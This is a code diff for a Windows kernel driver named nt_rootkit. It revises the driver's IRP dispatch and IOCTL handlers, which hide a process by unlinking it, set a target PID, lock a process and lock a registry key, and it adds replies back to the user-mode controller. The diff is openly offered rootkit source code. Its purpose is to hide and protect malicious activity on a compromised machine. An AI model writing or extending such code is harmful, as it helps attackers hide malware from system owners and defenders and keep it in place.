@@ -13,9 +13,9 @@ NTSTATUS nt_rootkit_create_close(PDEVICE_OBJECT dev_obj, PIRP irp)
 
         io_stack = IoGetCurrentIrpStackLocation(irp);
 
-        switch (io_stack->Parameters.DeviceIoControl.IoControlCode) {
+        switch (io_stack->MajorFunction) {
         case IRP_MJ_CREATE:
-                DbgPrint(DRIVER_PREFIX "handle to symlink opened.");
+                DbgPrint(DRIVER_PREFIX "handle to symlink opened");
                 break;
         case IRP_MJ_CLOSE:
                 DbgPrint(DRIVER_PREFIX "handle to symlink closed");
@@ -33,27 +33,46 @@ NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp)
 {
         UNREFERENCED_PARAMETER(dev_obj);
         PIO_STACK_LOCATION io_stack = NULL;
+        CHAR* response = "nt_rootkit: handled custom ioctl";
         
         io_stack = IoGetCurrentIrpStackLocation(irp);
 
         switch (io_stack->Parameters.DeviceIoControl.IoControlCode) {
         case IO_HIDE_PROC:
-                DbgPrint(DRIVER_PREFIX "unlinking process.");
+                DbgPrint(DRIVER_PREFIX "recieved %s",
+                         (CHAR*)irp->AssociatedIrp.SystemBuffer);
                 proc_unlink((PUINT32)irp->AssociatedIrp.SystemBuffer);
+                response = "nt_rootkit: process hidden";
                 break;
         case IO_PID_PROC:
+                DbgPrint(DRIVER_PREFIX "recieved %s",
+                        (CHAR*)irp->AssociatedIrp.SystemBuffer);
                 proc_set_pid((PUINT32)irp->AssociatedIrp.SystemBuffer);
+                response = "nt_rootkit: process id set";
                 break;
         case IO_LOCK_PROC:
+                DbgPrint(DRIVER_PREFIX "recieved %s",
+                        (CHAR*)irp->AssociatedIrp.SystemBuffer);
                 lock_proc((HANDLE)irp->AssociatedIrp.SystemBuffer);
+                response = "nt_rootkit: process locked";
                 break;
         case IO_LOCK_KEY:
+                DbgPrint(DRIVER_PREFIX "recieved %s",
+                        (CHAR*)irp->AssociatedIrp.SystemBuffer);
                 lock_key((PUNICODE_STRING)irp->AssociatedIrp.SystemBuffer);
+                response = "nt_rootkit: regkey locked";
+                break;
+        default:
                 break;
         }
 
-        irp->IoStatus.Information = 0;
+        irp->IoStatus.Information = strlen(response);
         irp->IoStatus.Status = STATUS_SUCCESS;
+
+        DbgPrint(DRIVER_PREFIX "responding to user");
+        RtlCopyMemory(irp->AssociatedIrp.SystemBuffer, 
+                response, strlen(response));
+
         IoCompleteRequest(irp, IO_NO_INCREMENT);
 
         return STATUS_SUCCESS;
